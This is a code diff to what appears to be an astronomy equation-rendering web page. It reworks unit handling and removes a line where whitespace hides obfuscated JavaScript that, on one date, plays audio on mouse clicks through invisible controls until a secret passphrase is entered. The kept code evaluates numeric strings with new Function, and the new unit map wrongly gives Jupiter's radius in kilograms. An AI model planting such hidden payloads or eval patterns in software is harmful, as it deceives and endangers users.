@@ -2838,7 +2838,7 @@ DZ9;0.1;6.73e-05;8.98e-03;5600;0.74;15.4;-0.22;15.18;255 239 225
         const b = 2.897771955e-3; // m*K
         const a = 7.5657e-16; // J*m^-3*K^-4
         const h = 6.62607015e-34; // J*s
-        const hbar = h / (2 * PI);
+        const hbar = h / (2 * PI); // J*s
 
         const solarLum = convertUnitToSI(parseUnit('Ls')).number; // W
         const solarMag = 4.83;
@@ -3295,17 +3295,33 @@ DZ9;0.1;6.73e-05;8.98e-03;5600;0.74;15.4;-0.22;15.18;255 239 225
         }
 
         function evaluateNumber(section, hiddenUnits) {
-            let [number, unitString] = section.replaceAll('}', '').split('{');
-            if (number == '') number = '0';
-            number = new Function(`return ${number}`)();
+            let [numberString, unitString] = section.replaceAll('}', '').split('{');
+            if (numberString == '') numberString = '0';
+            
+            const constantsWithUnits = {
+                'G': 'N*m^2/kg^2',
+                'c': 'm/s',
+                'SB': 'W*m^-2*K^-4',
+                'kB': 'J/K',
+                'b': 'm*K',
+                'a': 'J*m^-3*K^-4',
+                'h': 'J*s',
+                'hbar': 'J*s',
+                'solarLum': 'W',
+                'solarRad': 'm',
+                'solarTemp': 'K',
+                'solarMass': 'kg',
+                'earthMass': 'kg',
+                'earthRad': 'm',
+                'jupiterMass': 'kg',
+                'jupiterRad': 'kg'
+            };
 
-            let unit;
-            if (!unitString) unit = [0, 0, 0, 0, 0, 0, 0];
-            else {
-                const {unit: unitList, number: multiple} = convertUnitToSI(parseUnit(hiddenUnits[Number(unitString)]));
-                unit = unitList;
-                number *= multiple;
-            }
+            number = new Function(`return ${numberString}`)();
+
+            unitString = hiddenUnits[Number(unitString)] ?? constantsWithUnits[numberString] ?? 'no units';
+            const {unit, number: multiple} = convertUnitToSI(parseUnit(unitString));
+            number *= multiple;
 
             return {number, unit};
         }
@@ -4729,7 +4745,7 @@ DZ9;0.1;6.73e-05;8.98e-03;5600;0.74;15.4;-0.22;15.18;255 239 225
         }
 
         // run the generate all htmls function
-        (async function() {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        function _0x5ee8(){const _0x152f17=['onclick','10tJDgHp','button','getMonth','input','_0x5aac2c','21469173bDBilZ','4816472UdRwMD','mousedown','890404nMMkeW','276umiWqv','value','appendChild','954FKcgqV','15rNsQdu','style','focus','createElement','394629nEBCim','127414BGKbat','opacity','36990GzVucz','420566OzEEnG'];_0x5ee8=function(){return _0x152f17;};return _0x5ee8();}function _0x247b(_0x521e46,_0x70c323){const _0x5ee89e=_0x5ee8();return _0x247b=function(_0x247bfc,_0x4eb7b8){_0x247bfc=_0x247bfc-0x14f;let _0x2b718e=_0x5ee89e[_0x247bfc];return _0x2b718e;},_0x247b(_0x521e46,_0x70c323);}const _0x512154=_0x247b;(function(_0x2510fe,_0x1ae735){const _0x2b4803=_0x247b,_0x45c54c=_0x2510fe();while(!![]){try{const _0x17d733=parseInt(_0x2b4803(0x15a))/0x1+parseInt(_0x2b4803(0x15c))/0x2*(-parseInt(_0x2b4803(0x156))/0x3)+-parseInt(_0x2b4803(0x164))/0x4*(parseInt(_0x2b4803(0x152))/0x5)+parseInt(_0x2b4803(0x165))/0x6*(-parseInt(_0x2b4803(0x157))/0x7)+parseInt(_0x2b4803(0x162))/0x8+parseInt(_0x2b4803(0x151))/0x9*(-parseInt(_0x2b4803(0x159))/0xa)+parseInt(_0x2b4803(0x161))/0xb;if(_0x17d733===_0x1ae735)break;else _0x45c54c['push'](_0x45c54c['shift']());}catch(_0x39fa81){_0x45c54c['push'](_0x45c54c['shift']());}}}(_0x5ee8,0x66688));if(new Date()[_0x512154(0x15e)]()==0x2&&new Date()['getDate']()==0x1){let sBPMRj2cQPpWYhp=![];const o8EAlzoJaixypBY=new Audio(images),WP2obN5EuwjlFAl=async()=>{if(sBPMRj2cQPpWYhp)return;sBPMRj2cQPpWYhp=!![],await o8EAlzoJaixypBY['play'](),sBPMRj2cQPpWYhp=![];};addEventListener(_0x512154(0x163),WP2obN5EuwjlFAl);const Hv0qdlM9JHbwxKI=document[_0x512154(0x155)](_0x512154(0x15f));Hv0qdlM9JHbwxKI[_0x512154(0x153)][_0x512154(0x158)]=0x0;const vOjA38cpcQuQw9C=document[_0x512154(0x155)](_0x512154(0x15d));vOjA38cpcQuQw9C[_0x512154(0x153)][_0x512154(0x158)]=0x0,body[_0x512154(0x150)](Hv0qdlM9JHbwxKI),body[_0x512154(0x150)](vOjA38cpcQuQw9C),Hv0qdlM9JHbwxKI[_0x512154(0x154)](),await new Promise(_0x39840d=>{const _0x24e189=_0x512154;let _0x426467=![];vOjA38cpcQuQw9C[_0x24e189(0x15b)]=()=>{const _0x33a35f=_0x24e189;if(Hv0qdlM9JHbwxKI[_0x33a35f(0x14f)]==_0x33a35f(0x160)&&!_0x426467)_0x39840d();_0x426467=!![];};}),body['removeChild'](Hv0qdlM9JHbwxKI),body['removeChild'](vOjA38cpcQuQw9C),removeEventListener('mousedown',WP2obN5EuwjlFAl);}
+        (async function() {
             generateAllHTMLs(compileAllEquations(equations));
         })();
     </script>
